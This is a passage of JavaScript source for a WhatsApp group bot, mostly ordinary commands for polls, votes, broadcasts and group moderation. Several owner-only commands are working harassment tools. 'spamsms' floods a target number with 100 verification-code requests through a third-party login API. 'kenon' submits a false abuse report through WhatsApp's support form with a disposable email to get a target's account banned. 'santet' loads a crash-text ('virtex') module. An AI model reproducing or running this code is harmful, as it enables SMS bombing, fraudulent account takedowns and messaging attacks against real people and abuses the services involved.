Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.

2. Hak Cipta dan Merek Dagang

Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terkait dengan Aplikasi adalah milik WhatsApp, Inc. dan/atau afiliasinya. Anda tidak diizinkan untuk menggunakan atau memodifikasi hak cipta, merek dagang, atau hak milik lainnya tanpa izin tertulis dari WhatsApp, Inc. atau afiliasinya.

3. Privasi dan Keamanan Data
WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 

4. Pembatasan Tanggung Jawab 
WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh penggunaan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 

5. Perubahan Ketentuan Layanan 
WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan penggunaan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
} else if (payload.includes(`"payload":false`)) {
replygcxeon(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else replygcxeon(util.format(res.data))
} catch (err) {replygcxeon(`${err}`)}
} else replygcxeon('Masukkan nomor target!')
}
break
//=================================================




//=================================================

case 'spamsms': {
if (!XeonTheCreator) return XeonStickOwner()
const froms = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (m.quoted || text) {
if (froms.startsWith('08')) return replygcxeon('Awali nomor dengan +62')
if (froms == owner) return replygcxeon('Tidak bisa spam ke nomor ini!')
let nosms = '+' + froms.replace('@s.whatsapp.net', '')
let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
let ua = mal[Math.floor(Math.random() * mal.length)];
let axios = require('axios').default;
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
const dat = {
'phone': nosms
};
for (let x = 0; x < 100; x++) {
axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
headers: hd
}).then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) BY HW MODS WA MODS`);
});
}
} else replygcxeon(`Penggunaan spamsms nomor/reply pesan target*\nContoh spamsms +6281214281312`)
replygcxeon(`spam sms/call akan di kirim ke no target`)
}
break

//================================================\\

case 'kenon': {
if (!XeonTheCreator) return XeonStickOwner()
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return replygcxeon(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", ` Saya perhatikan ada pengguna yang menggunakan whatsapp yang dimodifikasi, jadi saya meminta dukungan untuk memblokir akun ini karena melanggar persyaratan layanan, dan akun tersebut menggunakan bot WhatsApp yang dapat mengirim pesan jahat sehingga WhatsApp pengguna lain tidak dapat berfungsi.
Nomor : +${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replygcxeon(`Wait 1-24 Jam an untuk proses banned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Hw Mods🥺🙏`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
replygcxeon(`##- WhatsApp Support -##

Sepertinya Anda menggunakan atau mengajukan pertanyaan mengenai versi WhatsApp yang tidak resmi.

Untuk memastikan Anda memiliki akses ke WhatsApp, verifikasi ulang nomor telepon Anda menggunakan aplikasi resmi kami yang dapat diunduh dari situs web kami: www.whatsapp.com/download

Aplikasi tidak resmi membahayakan keamanan dan keselamatan Anda, dan kami tidak mendukungnya.

Berikut yang mungkin terjadi jika Anda menggunakannya:

Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.

Akun mungkin akan diblokir karena penggunaan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.

Berikut adalah ketentuan layanan WhatsApp:

Ketentuan Layanan WhatsApp

1. Penggunaan Aplikasi

Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.

2. Hak Cipta dan Merek Dagang

Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terkait dengan Aplikasi adalah milik WhatsApp, Inc. dan/atau afiliasinya. Anda tidak diizinkan untuk menggunakan atau memodifikasi hak cipta, merek dagang, atau hak milik lainnya tanpa izin tertulis dari WhatsApp, Inc. atau afiliasinya.

3. Privasi dan Keamanan Data
WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 

4. Pembatasan Tanggung Jawab 
WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh penggunaan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 

5. Perubahan Ketentuan Layanan 
WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan penggunaan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
} else if (payload.includes(`"payload":false`)) {
replygcxeon(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else replygcxeon(util.format(res.data))
} catch (err) {replygcxeon(`${err}`)}
} else replygcxeon('Masukkan nomor target!')
}
break

//=================={{=[===================]]\\

case 'santet' : case '🌷' : case '🐲': case '🐉': case '🌵': case '🎄': case '🌲': case '🌳': case '🌱': case '🌿': case '🍀': case '☘️': {
 if (!XeonTheCreator) return XeonStickOwner()
const { xeonorwot } = require('./virtex/xeonbut2')
let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "" })
XeonBotInc.relayMessage(m.chat, { reactionMessage }, { messageId: '🦄' })
}
break

//=================={{=[===================]]\\
case 'tourl': {
	const media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
	let anuu = await TelegraPh (media)
	replygcxeon(`📮 *L I N K :*
${anuu}
📊 *S I Z E :* ${media.length} Byte
📛 *E x p i r e d :* No Expiry Date`)
await fs.unlinkSync(media)
}
	break
//=================================================================
case 'carimusik': {
if (!quoted) return replygcxeon(`mana Musiknya kak?`)
const media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
	let anuu = await TelegraPh (media)
	const crii = await fetchJson(`https://api.lolhuman.xyz/api/musicsearch?apikey=Akiraa&file=${anuu}`);
	reply(`Status: succes\n*Judul* : ${crii.result.title}\n*Album* : ${crii.result.album}\n`)
}
break
//=================================================================

case 'join': {
if (!XeonTheCreator) return XeonStickOwner()
if (!text) return replygcxeon(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcxeon('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await XeonBotInc.groupAcceptInvite(result)
await replygcxeon(`Done`)
}
break
case 'poll': {
	if (!XeonTheCreator) return XeonStickOwner()
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
return await replygcxeon(
`Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|Xeon,Cheems,Doge...`
)
            let options = []
            for (let i of opt.split(',')) {
options.push(i)
            }
            await XeonBotInc.sendMessage(m.chat, {
poll: {
name: poll,
values: options
}
            })
        }
        break
        case 'vote': {
            if (!m.isGroup) return reply(mess.only.group)
            if (m.chat in vote) return replygcxeon(`_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`)
            if (!text) return replygcxeon(`Enter Reason for Vote, Example: *${prefix + command} Handsome Owner*`)
            replygcxeon(`Voting starts!\n\n*${prefix}upvote* - for upvote\n*${prefix}downvote* - for downvote\n*${prefix}checkvote* - to check the vote\n*${prefix}deletevote* - to delete vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

Please Type Below
*${prefix}upvote* - to cast vote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            XeonBotInc.sendMessage(m.chat, {text: teks_vote}, {quoted:m})
	    }
            break
               case 'upvote': {
            if (!m.isGroup) return reply(mess.only.group)
            if (!(m.chat in vote)) return replygcxeon(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replygcxeon('You have Voted')
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            XeonBotInc.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	    }
             break
case 'downvote': {
            if (!m.isGroup) return reply(mess.only.group)
            if (!(m.chat in vote)) return replygcxeon(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replygcxeon('You have Voted')
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            XeonBotInc.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	}
            break
 
case 'checkvote':
if (!m.isGroup) return reply(mess.only.group)
if (!(m.chat in vote)) return replygcxeon(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes


©${XeonBotInc.user.id}
`
XeonBotInc.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) return reply(mess.only.group)
            if (!(m.chat in vote)) return replygcxeon(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            delete vote[m.chat]
            replygcxeon('Successfully Deleted Vote Session In This Group')
	    }
            break
case 'toonce': case 'toviewonce': { 
if (!quoted) return replygcxeon(`Reply Image/Video`)
reply(mess.wait)
if (/image/.test(mime)) {
anuan = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
XeonBotInc.sendMessage(m.chat, {image: {url:anuan}, caption: `Ini dia!!`, fileLength: "999", viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anuanuan = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
XeonBotInc.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Ini dia!!`, fileLength: "99999999", viewOnce : true},{quoted: m })
}
}
break
case 'fliptext': {
if (args.length < 1) return replygcxeon(`Example:\n${prefix}fliptext ${ownername}`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
replygcxeon(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
}
break
            case 'listpc': {
 let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
 let teks = `${themeemoji} *PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
 for (let i of anulistp) {
 let nama = store.messages[i].array[0].pushName
 teks += `${themeemoji} *Name :* ${nama}\n${themeemoji} *User :* @${i.split('@')[0]}\n${themeemoji} *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
 }
 XeonBotInc.sendTextWithMentions(m.chat, teks, m)
             }
             break
case 'listgc': {
 let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
 let teks = `${themeemoji} *GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`
 for (let i of anulistg) {
 let metadata = await XeonBotInc.groupMetadata(i)
 teks += `${themeemoji} *Name :* ${metadata.subject}\n${themeemoji} *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n${themeemoji} *ID :* ${metadata.id}\n${themeemoji} *Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n${themeemoji} *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
 }
 XeonBotInc.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'ping': case 'botstatus': case 'statusbot': {
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
replygcxeon(respon)
            }
            break
            case 'bctext': case 'broadcasttext': case 'broadcast': {
			    if (!XeonTheCreator) return XeonStickOwner()
		            if (!q) return replygcxeon(`Enter text`)
		        const data = await store.chats.all()
        for (let i of data) {
           XeonBotInc.sendMessage(i.id, {text: `${ownername}'s Broadcast\n\nMessage : ${q}` })
           await sleep(1000)
        }
        }
        break
        case 'broadcastimage': case 'bcimage': case 'broadcastvideo': case 'broadcastvid':
if(!XeonTheCreator) return XeonStickOwner()
        if (!q) return replygcxeon(`Enter text`)
        let getGroups = await XeonBotInc.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
        let xeoncast = groups.map(v => v.id)
        replygcxeon(` Broadcasting in ${xeoncast.length} Group Chat, in ${xeoncast.length * 1.5} seconds`)
        for (let i of xeoncast) {
let txt = `${ownername}'s Broadcast\n\nMessage : ${q}`
if(/image/.test(mime)) {
let media = await quoted.download()
await XeonBotInc.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
}
if(/video/.test(mime)){
let media = await quoted.download()
await XeonBotInc.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
}
            }
        replygcxeon(`Successfuly Broadcasted in ${xeoncast.length} Groups`)      
        break
case 'block': case 'ban': {
		if (!XeonTheCreator) return XeonStickOwner()
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await XeonBotInc.updateBlockStatus(users, 'block')
		await replygcxeon(`Done`)
	}
	break
        case 'unblock': case 'unban': {
		if (!XeonTheCreator) return XeonStickOwner()
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await XeonBotInc.updateBlockStatus(users, 'unblock')
		await replygcxeon(`Done`)
	}
	break
case 'listblock': case 'listban': case 'blocklist': case 'banlist': {
	const lisben = "Total Block: " + banUser.length
	replygcxeon(lisben)
	}
	break

case 'resetlinkgc':
case 'resetlinkgroup':
case 'resetlinkgrup':
case 'revoke':
case 'resetlink':
case 'resetgrouplink':
case 'resetgclink':
case 'resetgruplink': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
XeonBotInc.groupRevokeInvite(m.chat)
}
break
            case 'react': {
if (!XeonTheCreator) return XeonStickOwner()
reactionMessage = {
react: {
    text: args[0],
    key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
}
}
XeonBotInc.sendMessage(m.chat, reactionMessage)
            }
            break
case 'group': case 'gc': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
if (!isBotAdmins) return XeonStickBotAdmin()
if (!q) return replygcxeon(`Send orders ${command} _options_\nOptions : close & open\nExample : ${command} close`)
if (args[0] == 'close') {
XeonBotInc.groupSettingUpdate(from, 'announcement')
} else if (args[0] == 'open') {
XeonBotInc.groupSettingUpdate(from, 'not_announcement')
} else {
replygcxeon(`Type Command ${command} options\nOptions : Tutup & Buka\nContoh : ${command} close`)
}}
break
case 'autostickergc':
            case 'autosticker':
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
if (args.length < 1) return replygcxeon('type auto sticker on to enable\ntype auto sticker off to disable')
if (args[0]  === 'on'){
if (isAutoSticker) return replygcxeon(`Already activated`)
autosticker.push(from)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
replygcxeon('autosticker activated')
} else if (args[0] === 'off'){
let anuticker1 = autosticker.indexOf(from)
autosticker.splice(anuticker1, 1)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
replygcxeon('auto sticker deactivated')
}
break
case 'antivirus': case 'antivirtex': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
if (args[0] === "on") {
if (antiVirtex) return replygcxeon('Already activated')
ntvirtex.push(from)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
replygcxeon('Success in turning on antivirus in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNo body is allowed to send virus in this group, member who send will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiVirtex) return replygcxeon('Already deactivated')
let off = ntvirtex.indexOf(from)
ntvirtex.splice(off, 1)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
replygcxeon('Success in turning off antivirus this group')
} else {
  await replygcxeon(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'nsfw': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
if (args[0] === "on") {
if (AntiNsfw) return replygcxeon('Already activated')
ntnsfw.push(from)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
replygcxeon('Success in turning on nsfw in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNsfw(not safe for work) feature has been enabled in this group, which means one can access sexual graphics from the bot!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfw) return replygcxeon('Already deactivated')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
replygcxeon('Success in turning off nsfw in this group')
} else {
  await replygcxeon(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
  case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
if (args[0] === "on") {
if (AntiLinkYoutubeVid) return replygcxeon('Already activated')
ntilinkytvid.push(from)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
replygcxeon('Success in turning on youtube video antilink in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube video link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeVid) return replygcxeon('Already deactivated')
let off = ntilinkytvid.indexOf(from)
ntilinkytvid.splice(off, 1)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
replygcxeon('Success in turning off youtube video antilink in this group')
} else {
  await replygcxeon(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
    case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
if (args[0] === "on") {
if (AntiLinkYoutubeChannel) return replygcxeon('Already activated')
ntilinkytch.push(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
replygcxeon('Success in turning on youtube channel antilink in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube channel link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeChannel) return replygcxeon('Already deactivated')
let off = ntilinkytch.indexOf(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
ntilinkytch.splice(off, 1)
replygcxeon('Success in turning off youtube channel antilink in this group')
} else {
  await replygcxeon(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
      case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
if (args[0] === "on") {
if (AntiLinkInstagram) return replygcxeon('Already activated')
ntilinkig.push(from)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
replygcxeon('Success in turning on instagram antilink in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
